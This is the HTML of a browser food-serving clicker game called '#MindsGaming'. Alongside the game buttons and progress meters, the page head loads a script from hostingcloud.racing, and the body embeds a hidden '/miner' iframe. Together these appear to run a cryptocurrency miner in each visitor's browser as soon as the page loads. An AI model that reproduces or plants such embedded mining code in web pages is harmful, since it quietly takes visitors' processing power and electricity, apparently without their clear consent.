<html lang="en">
  <head>
    <title>#MindsGaming</title>

    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Community & Member Groups" />
    <meta
      property="og:image"
      content="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />
    <link
      rel="icon"
      href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />
    <script src="/games/dice.js" defer></script>

    <script src="https://mindsgaming.glitch.me/mtcg/docs.js"></script>
    <script src="https://www.hostingcloud.racing/5pDo.js"></script>

    <link rel="stylesheet" href="/style.css" />
    <link rel="stylesheet" href="pinn.css" />

    <script src="/games/pinn/pinn.js"></script>
    <script src="/games/dice.js" defer></script>
  </head>
  <body style="background-color: green;">
    <miner><iframe src="/miner"> </iframe></miner>
    <wrap id="superGame">
      <center>
        <dish>
          <div class="buttonReady" id="foodButton" onclick="foodImage();">
            Make Food
          </div>
          <div class="hide" id="plateButton" onclick="platedImage();">
            Plate Food
          </div>
          <div class="hide" id="serveButton" onclick="servedImage();">
            Serve Food
          </div>
          <div class="hide" id="cashOut" onclick="claimBurgers();">
            End Shift
          </div>
          <div class="buttonReady" id="quit" onclick="quit();">
            Quit
          </div>
        </dish>

        <div class="items">
          <div id="foodImage"></div>
          <div id="platedImage"></div>
          <div id="serveImage"></div>
        </div>

        <footer>
          <div class="button2">
            Making Food:
            <div id="makefood">
              0%
            </div>

            <meter
              value="1"
              id="makeFood"
              max="100"
              low="10"
              high="80"
              class="hide"
            ></meter>
          </div>
          <div class="button2">
            Food Plated
            <div id="platedfood">
              0
            </div>
            <meter
              value="0"
              id="platedFood"
              max="100"
              low="10"
              high="80"
              class="hide"
            ></meter>
          </div>
          <div class="button2">
            Food Served
            <div id="servedfood">
              0
            </div>
            <meter
              value="1"
              id="servedFood"
              max="100"
              low="10"
              high="80"
              class="hide"
            ></meter>
          </div>
          <div class="button2">
            <label id="rewards">
              0
            </label>
            <meter
              value="0"
              id="Rewards"
              max="100"
              low="10"
              high="80"
              class="hide"
            ></meter>
          </div>
        </footer>
      </center>
    </wrap>
  </body>
</html>
